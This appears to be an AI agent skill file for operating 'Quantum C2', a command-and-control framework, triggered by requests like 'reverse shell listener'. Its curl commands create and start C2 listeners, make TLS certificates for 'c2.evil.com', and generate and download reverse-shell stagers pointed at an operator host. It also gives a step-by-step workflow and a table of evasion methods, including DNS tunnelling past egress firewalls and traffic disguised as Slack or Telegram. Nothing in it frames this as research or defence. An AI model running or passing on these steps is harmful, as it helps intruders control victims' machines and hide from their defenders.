---
name: quantum-c2-listeners
description: >
  C2 listener management for Quantum C2. Use when the user needs to create, start, stop, or manage C2 channel listeners. Covers TCP, HTTPS, TLS, DNS, Telegram, IRC, and Slack listeners. Triggers on: "listener", "C2 channel", "reverse shell listener", "start listener", "listener management", "C2 server", "command and control listener".
---

# Quantum C2 Listener Management Skill

Manage C2 channel listeners for implant connections.

## Listener Types

| Protocol | Port | Use Case |
|----------|------|----------|
| `tcp` | Any | Raw TCP reverse shell |
| `https` | 443 | Encrypted HTTPS C2 |
| `tls` | 443 | mTLS with cert pinning |
| `dns` | 53 | DNS tunneling C2 |
| `telegram` | Bot API | Telegram bot C2 |
| `irc` | 6697 | IRC channel C2 |
| `slack` | Bot API | Slack app C2 |

## Listeners

### List All Listeners
```bash
curl -H "Authorization: Bearer $C2_TOKEN" http://localhost:8000/api/listeners/
```

### Create Listener
```bash
curl -X POST http://localhost:8000/api/listeners/ \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "HTTPS-C2-1",
    "port": 443,
    "protocol": "https",
    "host": "0.0.0.0",
    "auto_session": true
  }'
```

### Get Listener Details
```bash
curl -H "Authorization: Bearer $C2_TOKEN" http://localhost:8000/api/listeners/{id}
```

### Start Listener
```bash
curl -X POST http://localhost:8000/api/listeners/{id}/start \
  -H "Authorization: Bearer $C2_TOKEN"
```

### Stop Listener
```bash
curl -X POST http://localhost:8000/api/listeners/{id}/stop \
  -H "Authorization: Bearer $C2_TOKEN"
```

### Delete Listener
```bash
curl -X DELETE http://localhost:8000/api/listeners/{id} \
  -H "Authorization: Bearer $C2_TOKEN"
```

## Connection Management

### Get Connections
```bash
curl -H "Authorization: Bearer $C2_TOKEN" http://localhost:8000/api/listeners/{id}/connections
```

### Traffic Stats
```bash
curl -H "Authorization: Bearer $C2_TOKEN" http://localhost:8000/api/listeners/traffic
```

## Certificate Generation

```bash
curl -X POST http://localhost:8000/api/listeners/generate-certs \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"domain":"c2.evil.com"}'
```

## Stager Generation

### List Stager Types
```bash
curl -H "Authorization: Bearer $C2_TOKEN" http://localhost:8000/api/sessions/stagers
```

### Generate Stager
```bash
curl -X POST http://localhost:8000/api/sessions/stagers/generate \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "stager_type": "python",
    "platform": "linux",
    "lhost": "10.0.0.1",
    "lport": 443,
    "listener_id": "listen-abc123"
  }'
```

### Download Stager
```bash
curl -O http://localhost:8000/api/sessions/stagers/{stager_id} \
  -H "Authorization: Bearer $C2_TOKEN"

curl -O http://localhost:8000/api/sessions/stagers/{stager_id}/download \
  -H "Authorization: Bearer $C2_TOKEN"
```

## Listener Workflow

```bash
# 1. Generate TLS certs
curl -X POST http://localhost:8000/api/listeners/generate-certs \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"domain":"c2.yourdomain.com"}'

# 2. Create HTTPS listener
curl -X POST http://localhost:8000/api/listeners/ \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"Main-C2","port":443,"protocol":"https","auto_session":true}'

# 3. Generate payload
curl -X POST http://localhost:8000/api/sessions/stagers/generate \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"stager_type":"python","platform":"linux","lhost":"10.0.0.1","lport":443}'

# 4. Start listener
curl -X POST http://localhost:8000/api/listeners/{id}/start \
  -H "Authorization: Bearer $C2_TOKEN"

# 5. Monitor connections
curl -H "Authorization: Bearer $C2_TOKEN" http://localhost:8000/api/listeners/{id}/connections
```

## C2 Channel Abstraction

| Channel | Implementation | Evasion |
|---------|---------------|---------|
| HTTPChannel | Randomized UA, Referer, Paths | Mimics legitimate traffic |
| DNSChannel | Base64-encoded subdomain queries | Bypasses firewall egress |
| TelegramChannel | Bot API with message chunking | Consumer app blending |
| IRCChannel | SSL-wrapped socket | Chat protocol camouflage |
| SlackChannel | Bot API with channel messaging | Enterprise app blending |
| TLSChannel | mTLS with certificate pinning | Mutual authentication |
